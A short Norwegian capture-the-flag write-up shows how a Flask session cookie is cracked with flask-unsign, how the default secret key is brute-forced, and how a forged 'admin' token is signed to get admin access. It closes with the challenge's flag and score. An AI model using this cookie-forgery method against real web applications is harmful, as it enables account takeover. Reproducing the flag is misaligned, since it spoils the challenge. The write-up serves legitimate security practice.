# 2.03_anvilnotes_admin

Stod noe i den første notaten om at han ville secure flask tokens. Og ser i cookies at jeg har en flask token som auth. Så lastet ned flask-unsign via pip3 og kjørte det på cookien som hadde flask token i seg.

```bash
┌──(toffe㉿kali)-[~]
└─$ flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6ImFkbWlOIn0.Y7N13g.6zY67y3r6J5jAHbOeXIrj4-nHZs'
[*] Session decodes to: {'username': 'admiN'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----.m2
[*] Attempted (2432): /-W%/97se0m46r@bv!6&b!l76a#-%
[*] Attempted (4480): 5#y2LF4Q8z8a52f30af11409c74288
[*] Attempted (25728): -----BEGIN PRIVATE KEY-----***
[+] Found secret key after 35712 attemptsWtem.UserPro
'This is an UNSECURE Secret. CHANGE THIS for production environments.'
```

Kunne da generere tokens som jeg bare ønsket:

```bash
┌──(toffe㉿kali)-[~]
└─$ flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'This is an UNSECURE Secret. CHANGE THIS for production environments.'
eyJ1c2VybmFtZSI6ImFkbWluIn0.Y7N5YQ.hZ2N9dpArz7Y3BrXqcgTlEMN3yw
```

Byttet med denne token og så var jeg logget inn som "admin" og så kjapt et flagg til.

```
Kategori: 2. Oppdrag
Oppgave:  2.03_anvilnotes_admin
Svar:     7d9299f21072f058d3c4d313c57b4093
Poeng:    10

Som admin har du kanskje tilgang til mer funksjonalitet?
```